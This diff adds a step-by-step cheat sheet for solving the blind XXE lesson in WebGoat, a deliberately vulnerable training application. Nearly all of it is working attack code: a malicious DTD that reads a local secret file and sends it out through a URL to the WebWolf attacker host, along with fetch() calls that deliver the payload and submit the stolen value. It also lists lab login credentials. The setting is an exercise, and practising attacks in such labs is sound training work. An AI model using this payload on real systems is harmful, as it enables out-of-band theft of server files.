@@ -1,0 +1,30 @@
+====================================================================
+QUICK REFERENCE - XXE BLIND ATTACK
+====================================================================
+
+1. UPLOAD DTD TO WEBWOLF
+   → Open: http://192.168.254.112:8002/WebWolf
+   → Login: nooniman / nooniman
+   → Upload: attack_remote.dtd (or create attack.dtd with content below)
+
+2. DTD CONTENT:
+<!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://localhost:8002/WebWolf/landing?secret=%file;'>">
+%eval;
+%exfil;
+
+3. VERIFY DTD:
+fetch('http://192.168.254.112:8002/files/nooniman/attack.dtd').then(r=>r.text()).then(console.log);
+
+4. SEND ATTACK:
+fetch('http://192.168.254.112:8001/WebGoat/xxe/blind',{method:'POST',credentials:'include',headers:{'Content-Type':'application/xml'},body:`<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://192.168.254.112:8002/files/nooniman/attack.dtd">%remote;]>
+<comment><text>Blind XXE</text></comment>`}).then(r=>r.text()).then(console.log);
+
+5. GET SECRET:
+   → WebWolf → Incoming requests → Find secret in URL
+
+6. SUBMIT:
+fetch('http://192.168.254.112:8001/WebGoat/xxe/blind',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({comment:"SECRET_HERE"})}).then(r=>r.text()).then(console.log);
+
+====================================================================
